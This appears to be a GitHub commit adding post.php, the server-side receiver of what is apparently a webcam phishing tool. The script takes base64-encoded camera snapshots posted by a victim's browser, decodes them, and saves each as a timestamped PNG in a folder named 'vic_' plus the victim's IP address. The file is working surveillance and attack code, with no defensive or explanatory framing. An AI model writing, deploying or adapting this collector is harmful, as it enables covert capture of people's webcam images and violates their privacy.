f3bd1d6123a7d4250968e55998001defaf440d1a
ravi714 <63838178+ravi714@users.noreply.github.com>
2021-12-31 04:55:36 +0000

    Add files via upload

---
+++ post.php
@@ -0,0 +1,22 @@
+<?php
+include 'ip.php';
+$date = date('dMYHis');
+$imageData=$_POST['cat'];
+
+if (!empty($_POST['cat'])) {
+error_log("Received" . "\r\n", 3, "Log.log");
+
+}
+if (!is_dir( "images/vic_".$ipaddress) ) {
+    mkdir( "images/vic_".$ipaddress );       
+} 
+
+$filteredData=substr($imageData, strpos($imageData, ",")+1);
+$unencodedData=base64_decode($filteredData);
+$fp = fopen( 'images/vic_'.$ipaddress.'/cam'.$date.'.png', 'wb' );
+fwrite( $fp, $unencodedData);
+fclose( $fp );
+
+exit();
+?>
+
